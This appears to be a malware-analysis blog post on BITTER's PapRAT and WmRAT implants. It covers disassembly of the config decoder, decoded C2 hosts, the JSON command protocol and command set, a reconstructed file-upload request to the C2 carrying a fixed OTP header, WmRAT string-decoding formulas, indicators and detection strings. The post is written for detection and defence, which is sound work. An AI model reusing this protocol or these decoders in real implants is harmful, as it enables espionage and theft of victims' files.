---
title: "PapRAT's one-time password is 123456"
date: 2026-11-18T22:00:00+00:00
slug: "paprat-otp"
description: "BITTER's C++ PapRAT sends the same OTP header, 123456, on every file transfer. Four builds of its WmRAT payload use four string decoders."
tags: ["paprat", "wmrat", "bitter", "rat", "msi", "lnk"]
sample:
  family: "PapRAT (C++)"
  sha256: "569a21b519aaac8c92f653d708ab6ef34e3f38ea967f47e041d1e2425f6a4b33"
  source: "[Hybrid Analysis](https://www.hybrid-analysis.com/sample/569a21b519aaac8c92f653d708ab6ef34e3f38ea967f47e041d1e2425f6a4b33)"
scope: medium
toc: true
---

PapRAT adds a one-time password to every file it uploads or downloads. In the C++ build Fortinet published, that password is the string `123456`, compiled in and sent unchanged on every request.

The rest of the implant is as plain. It is a 656,896-byte Boost.Asio program that polls one PHP page for JSON commands, and its screenshot command ignores the folder it is given. The WmRAT it was seen downloading is more interesting: four builds of it use four different string decoders.

All five of Fortinet's hashes were on Hybrid Analysis and none on MalwareBazaar. Sources:

- Fortinet FortiGuard Labs (Cara Lin), [BITTER Expands Its Arsenal with PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat), 2026-11-02: the infection chains, commands, XOR 0x50 config and C2 captures.
- Proofpoint, [Hidden in Plain Sight: TA397's New Attack Chain](https://www.proofpoint.com/us/blog/threat-insight/hidden-plain-sight-ta397s-new-attack-chain-delivers-espionage-rats), 2024-12-17: WmRAT's commands, its subtract-0x25 strings and port 47408.
- Elshinbary, Attfield, Klinger and Wagner (Threatray, Proofpoint), [The Bitter end](https://www.virusbulletin.com/uploads/pdf/conference/vb2025/papers/The-Bitter-end-unravelling-8-years-of-APT-antics.pdf), VB2025: BITTER's toolset before PapRAT, including the note that WmRAT decodes strings "using character subtraction in some cases and addition in other cases".

## What I found

- Upload, download and screenshot requests all carry `OTP: 123456`. The value never changes.
- The poll interval is a random 10 to 19 seconds, not a fixed 10. The first beacon goes out 34 to 43 seconds after start.
- A directory listing or status result stays in every beacon until the server replies with a new command.
- The screenshot command checks the wrong path, so every screenshot lands in `C:\programdata\ss.jpg`.
- Four WmRAT builds from 2023 to 2026 use four string decoders (three shapes) and four ports.
- All three Fortinet shortcuts came from one VMware VM image. A newer BITTER disk image still holds three earlier lures in its recycle bin.

![Chain from the VHDX lure through a shortcut, an MSI and PapRAT to the C2, with WmRAT as a later download](/img/paprat-otp/chain.svg "Fortinet's second chain, with the WmRAT download from its third")

The MSI is chain 2 in Fortinet's report. Its C2 is the one Fortinet decoded for that chain. The WmRAT arrow is dashed: Fortinet saw it downloaded in chain 3, by another PapRAT build.

## The MSI is one custom action

The installer has no files to install. Its `CustomAction` table holds one row, and nothing else in the package does work:

| Field | Value |
|---|---|
| Action | `_9AE88E99_8372_4458_9911_9EC626582345` |
| Type | 194 |
| Source | Binary stream `_2E9D1C8BAC5D0F288E61BF5987C52203` |
| Condition | `NOT REMOVE~="ALL"`, sequence 5999 |

Type 194 is 2 (an EXE stored in the `Binary` table) plus 0xC0 (run asynchronously, don't wait). The installer starts PapRAT and finishes.

The binary is a 32-bit PE built with Visual Studio 2022 (linker 14.43), timestamped 2026-03-05, posing as `bruzsvc.exe`.

## Four strings, XOR 0x50, and four bytes it skips

Fortinet named the config decoder `XOR_50`. The whole function is one loop, but it checks four values before it XORs:

```asm {title="FUN_0040d660, small-string branches removed"}
0040d68e  cmp byte ptr [ecx+edx], 0     ; (1) skip 0x00
0040d6a1  cmp byte ptr [ecx+edx], 0xa   ; (2) skip \n
0040d6b2  cmp byte ptr [ecx+edx], 0x5a  ; (3) skip 'Z'
0040d6c1  cmp byte ptr [ecx+edx], 0x50  ; (4) skip 'P'
...
0040d6df  xor al, 0x50
0040d6e1  mov byte ptr [ecx+edx], al
```

As a formula: `out[i] = in[i]` if `in[i]` is 0x00, 0x0A, 0x5A or 0x50, otherwise `in[i] ^ 0x50`.

The skip set is closed under the XOR: 0x50 is `0x00 ^ 0x50` and 0x5A is `0x0A ^ 0x50`. So the four values map to themselves and every other byte maps to another byte outside the set. The same function encodes and decodes, and a string with no NUL or newline never gains one, which keeps the ciphertext safe for C string functions.

I first read the skip as a loss: a plaintext `P` seemed impossible to encode. It isn't. It is stored as `P` and decoded as `P`.

The main function decodes four strings before its loop, and `SS1` decodes two more:

| Address | Decoded | Use |
|---|---|---|
| 0x47ccb4 | `www.rivingtonclarks[.]com` | host |
| 0x47cccc | `80` | port |
| 0x47ccd0 | `/beautiQuewonders` | base path |
| 0x47cce4 | `/beautiQuewonders/banaNa.php` | poll page |
| 0x47cda8 | `C:\programdata\ss.jpg` | fallback screenshot path |
| 0x47cdc0 | `/receive.php` | screenshot upload |

## The beacon carries the last result

The poll is an HTTP/1.1 `POST` with `Connection: close` and a JSON body. Fortinet's Figures 11 and 13 show beacons of the form `{"client_id":"<user>_<computer>","fdd":null}`, and Figure 13's reply carries an `SS1` command.

What the captures don't show is that the second key changes. It is the type of the last result, and its value is that result:

![PapRAT posts its client ID and last result; the server's next_data string holds a type/value command; the handler's result rides in the next poll](/img/paprat-otp/protocol.svg "One poll, one command, one result")

The reply is `{"next_data": "<string>"}`. PapRAT parses the string as a second JSON object with `type` and `value`. If the body has no `next_data`, or the string is empty, the function returns an empty string.

That empty string decides what PapRAT sends next. It clears its pending result only when `next_data` is non-empty. Until then, every poll repeats the last listing or status. A server with nothing to send answers `{"next_data":""}` (Figure 11), and gets the same result again 10 to 19 seconds later.

Clearing also empties the key. After a command that leaves no result, such as `UPP`, the next beacon is `{"client_id":...,"":null}`.

### The timing

Fortinet's report says PapRAT checks in "every 10 seconds". The sleep helper converts seconds to nanoseconds and calls `Sleep` in a loop, and the main function calls it four times:

```text
sleep 9 s                      before the config is decoded
sleep 15 s                     after the client ID is built
seed mt19937 from random_device
sleep uniform(10, 19) s        before the first poll
loop: poll, handle, sleep uniform(10, 19) s
```

The constant `0x6c078965` in the seeding loop is the Mersenne Twister's. The first beacon leaves 34 to 43 seconds after start, and later ones are at least 10 seconds apart.

Fortinet's two captures don't fit that. The `Date` headers in Figures 11 and 13 are 11:15:30 and 11:15:39, 9 seconds apart. A sandbox that shortens sleeps would explain it, but I can't check that from here.

## Eight commands and what they send back

The command names match Fortinet's table, which notes that `FDD` posts back as type `fdd`. What each returns:

| `type` | `value` | Does | Result key |
|---|---|---|---|
| `msg` | command line | thread runs `cmd /c <value>`, no window | own request |
| `FDD` | folder | sets working folder, lists it | `fdd` |
| `GDR` | folder | sets working folder, lists drives | `fdd` |
| `DEL` | file | `DeleteFileW`, lists the parent | `fdd` |
| `RUN` | file | `CreateProcessW`, no arguments | `sts` |
| `UPP` | file | multipart `POST` to `receive.php` | empty |
| `DWW` | local path | `GET send.php?file=<name>`, saves, lists the parent | `fdd` |
| `SS1` | folder | JPEG to `C:\programdata\ss.jpg`, uploads it | empty |

Directory listings are arrays of `{"name", "isDir", "size", "fmod"}` objects. `FDD` posts its listing at once in a separate request and also leaves it pending, so it goes out a second time with the next poll. The reply to that extra request is discarded, so a command in it is lost. `GDR`, `DEL` and `DWW` only leave theirs pending.

The `msg` thread posts the shell output itself, once, under the key `msg`. It runs detached, so the main loop keeps polling while the command runs.

The working folder from `FDD` is also the current directory for `msg` and `RUN`. There is no `cd` command; listing a folder is how the operator moves.

`SS1` means to save into the folder it is given. It builds `<value>\ss.jpg`, then checks whether that path is an existing directory and falls back to `C:\programdata\ss.jpg` if not. A file path is never a directory, so the fallback always wins. Fortinet's Figure 13 sends `C:\\Programdata`, which hides the bug: both paths are the same.

Nothing in the binary installs it. There is no registry, service, scheduled-task or file-copy API in the import table. Unless the operator adds persistence through `msg`, PapRAT lives only as long as the process the installer started.

## The one-time password

The three file-transfer commands build their requests by hand. Here is the upload, as the code assembles it:

```text
POST /beautiQuewonders/receive.php HTTP/1.1
Host: www.rivingtonclarks[.]com
Content-Type: multipart/form-data; boundary=----BoostBoundary7MA4YWxkTrZu0gW
Content-Length: <n>
OTP: 123456
ClientID: <user>_<computer>
Connection: close
```

Fortinet's Figure 14 shows these header lines, with the `OTP:` value passed in as a variable. That variable comes from one wide-string literal, `L"123456"` at 0x47cd44. The `UPP`, `DWW` and `SS1` handlers push its address at 0x40ea38, 0x40ed63 and 0x40f7d7. Nothing generates, rotates or receives it.

So the OTP is a static header value, and a cheap one to match on. The download request carries the same two headers on a `GET` and saves the file only if the response contains `200 OK`.

The multipart boundary is borrowed too. `----BoostBoundary7MA4YWxkTrZu0gW` is `----WebKitFormBoundary7MA4YWxkTrZu0gW`, the boundary in Postman's generated HTTP snippets ([issue 11084](https://github.com/postmanlabs/postman-app-support/issues/11084)), with `WebKitForm` swapped for `Boost`.

## WmRAT: four builds, four string decoders

Fortinet saw PapRAT deliver WmRAT and listed one WmRAT hash. Its strings don't decode with Proofpoint's subtract-0x25, and no other single subtraction key turned any `.rdata` string into a host name. The decoder at 0x405010 showed why: the amount subtracted grows with the position.

```text
out[i] = in[i] - min(i - 1, 10) - 0x29
```

That decodes `netmansrvdns[.]com`, which matches Fortinet's indicator. The port is the word passed to `htons`: 39186.

The VB2025 paper says WmRAT strings use subtraction "in some cases and addition in other cases", so I pulled the three WmRAT builds MalwareBazaar has under its BITTER tag and decoded each:

| Build | Compiled | String transform | C2 | Port |
|---|---|---|---|---|
| 811741d9 | 2023-05-11 | `in - 0x2e` | uxmesysconsole[.]com | 80 |
| 10cec5a8 | 2024-09-13 | `in - 0x25` | academymusica[.]com | 47408 |
| 411c0b9a | 2026-01-23 | `in - min(i-1,10) - 0x29` | netmansrvdns[.]com | 39186 |
| e6b523e7 | 2026-02-03 | `(in ^ i) - 0x14` | ashersoftlib[.]com | 44908 |

My brute force found the first three and nothing in e6b523e7. Its resolver showed why: the C2 string goes through two functions in a row, an XOR with the index and then a subtraction.

The 2024 build matches Proofpoint. I think the decoder is picked per build rather than per version, though four samples are a small base: the January 2026 build is positional, and the February one, compiled 11 days later, is a different shape again.

## The shortcuts came from one VM

The three shortcuts in Fortinet's list carry a tracker block. It records the NetBIOS name and volume ID of the machine where each was made, and the MAC-based object ID of its target:

| Shortcut | Runs | Machine | MAC in object ID |
|---|---|---|---|
| a3081df3 | `ftp.exe -s:icon.ico` | desktop-qghtbcb | 00:0c:29:4b:a7:1c |
| ccefbdec | `ftp.exe -s:icon.ico` | desktop-qghtbcb | 00:0c:29:4b:a7:1c |
| e3992f8c | `cmd.exe /c Visa_Details.msi & ...` | desktop-qghtbcb | 00:0c:29:f7:cd:72 |

All three share one machine name, one SID (`S-1-5-21-2032132435-...-1001`) and one volume ID. Both MACs start with 00:0c:29, VMware's prefix. The object IDs are timestamped 2026-01-27 for `ftp.exe` and 2024-10-07 for `cmd.exe`, so this VM's disk goes back to at least October 2024. Two MACs on one disk fit a cloned VM, so the safe statement is one VM image, possibly running as more than one machine. Fortinet's chain 1 and chain 2 shortcuts came from it.

### A disk image that kept its recycle bin

MalwareBazaar's BITTER tag also has a 71,303,168-byte VHDX first seen on 2026-11-11, after Fortinet's report. I expected chain 2 again, an MSI behind a shortcut. It holds one visible shortcut. It creates a scheduled task that runs every 13 minutes and pipes `curl` output into `cmd`. The VB2025 paper describes the same `conhost --headless` and split-variable pattern.

The disk also has a hidden `$RECYCLE.BIN`. Its `$I` records name three earlier lures, deleted while the image was mounted as `F:`:

| Deleted (UTC) | Original name |
|---|---|
| 2026-04-15 10:30 | `Tanzania_Analysis_Iran_US_War_Global_Trade_Economy.pdf<spaces>.wsf` |
| 2026-05-07 11:31 | `International Robotic Exhibition – Uganda Embassy Beijing ... .pdf.lnk` |
| 2026-07-23 06:05 | `Attachment-22 July 2026.pdf.lnk` |

The volume was created on 2026-02-05 and last written on 2026-11-03, by its NTFS timestamps. The operators reused one disk image for about nine months and shipped their trash with it. The two recycled shortcuts point at `florabrocuisine[.]com` and `adorefashionaccessories[.]com`, and the current one at `ratedbronzecrafts[.]com`. These shortcuts were made on two other VMware machines, desktop-on8m83u and desktop-tjesb0o.

## The extractors

Two scripts in the tools repo cover what this post decodes:

- [families/paprat](https://github.com/stateless-re/tools/tree/main/families/paprat) takes the MSI or the PE, reads the XOR key and skip set from the code, and decodes the config and the OTP literal.
- [families/wmrat](https://github.com/stateless-re/tools/tree/main/families/wmrat) tries the three decoder shapes on every `.rdata` string and reads the port from the `htons` call.

## What I couldn't determine

- I don't have the Rust build of PapRAT. Fortinet didn't list its hash, and MalwareBazaar has no PapRAT tag or signature.
- Whether the server checks the OTP. A server that ignores it would behave the same way from the implant's side.
- What the C2 sent for `DWW` in this chain. Fortinet saw WmRAT downloaded by the chain-3 build, which uses another C2.
- What the 80,307-byte recycled WSF does in full. Its JScript part assembles a `schtasks` command behind a harmless-looking XSLT test; I didn't decode the rest.

## Indicators

| SHA-256 | Role |
|---|---|
| `569a21b519aaac8c92f653d708ab6ef34e3f38ea967f47e041d1e2425f6a4b33` | MSI carrying PapRAT |
| `a16f17c204840df2b06c431887ad2f0c5b62b3c92cd601010b439f8715a7b24c` | PapRAT PE, extracted from the MSI |
| `411c0b9a2f98b927d806a685faf0c1ab1005647b4816157008892347fb88546b` | WmRAT (netmansrvdns) |
| `e6b523e77c31b89f8eb3489007bf14b3b9d34bc3870a9d96ecf7b99efa506c76` | WmRAT (ashersoftlib) |
| `10cec5a84943f9b0c635640fad93fd2a2469cc46aae5e43a4604c903d139970f` | WmRAT (academymusica) |
| `811741d9df51a9f16272a64ec7eb8ff12f8f26794368b1ff4ad5d30a1f4bb42a` | WmRAT (uxmesysconsole) |
| `a3081df333ca7f18bd90d10a45125ab5011dcf9d2806feae2935f09cab07da4c` | LNK, ftp.exe stager |
| `ccefbdec2718d864d9d33c743aabfcef88a8d7904d1c598bfcf15cf5f3591c88` | LNK, ftp.exe stager |
| `e3992f8c945b0761242377cba32d91b0a390c7cecd79478439843d93e6d2b76b` | LNK, runs the MSI |
| `0165e0fc13a6f9f2cbd181c1ec676ec7b0a1900980db214c4f5650aaf6e3a559` | VHDX lure |
| `f3821a13b3c47b660c03ad3b9c1728330fef67ea4f50e2f47bec56659d28f2d4` | LNK in the VHDX |
| `35a91d5cc31d57a327735ea6fb6299206211092b3534685ca307fb7748632004` | recycled LNK |
| `bfbe53c2b43a6673672ee4c5e7dfc177f8222018ac103c85ccc151fbfe62a8bb` | recycled LNK |
| `686847428df559f857bb4315078f17e6a208c7b2ab7b5937e7f8ab4dfae325fd` | recycled WSF |

| Network indicator | Role |
|---|---|
| `www.rivingtonclarks[.]com:80` | PapRAT C2, `/beautiQuewonders/` |
| `netmansrvdns[.]com:39186` | WmRAT C2 |
| `ashersoftlib[.]com:44908` | WmRAT C2 |
| `academymusica[.]com:47408` | WmRAT C2 (Proofpoint) |
| `uxmesysconsole[.]com:80` | WmRAT C2 |
| `ratedbronzecrafts[.]com` | VHDX stager, `/lsn.php` |
| `florabrocuisine[.]com` | recycled stager, `/lsn.php` |
| `adorefashionaccessories[.]com` | recycled stager, `/lsn.php` |

PapRAT strings worth matching: `OTP: `, `----BoostBoundary7MA4YWxkTrZu0gW`, `next_data`, `NULL_NULL`.

## ATT&CK

| ID | Technique | Here |
|---|---|---|
| T1204.002 | Malicious File | LNK lures in archives and a VHDX |
| T1218.007 | Msiexec | MSI with a type 194 custom action |
| T1036 | Masquerading | `bruzsvc.exe`, "Microsoft redistributables" |
| T1027 | Obfuscated Files or Information | XOR 0x50 config, WmRAT string transforms |
| T1071.001 | Web Protocols | JSON over HTTP `POST` |
| T1095 | Non-Application Layer Protocol | WmRAT over raw TCP |
| T1059.003 | Windows Command Shell | `msg` runs `cmd /c` |
| T1083 | File and Directory Discovery | `FDD`, `GDR` |
| T1113 | Screen Capture | `SS1` |
| T1105 | Ingress Tool Transfer | `DWW` |
| T1041 | Exfiltration Over C2 Channel | `UPP`, `SS1` |
| T1053.005 | Scheduled Task | VHDX and recycled shortcuts |

PapRAT's authentication is a header that never changes, on a request whose boundary was copied from an API tool's generated snippets. Both are better detection anchors than its XOR'd host name, which the next build will change. WmRAT shows how fast that happens: four builds, four string decoders, one family.

Thanks to Fortinet's Cara Lin for the report and hashes, and to Proofpoint and Threatray for the BITTER groundwork.
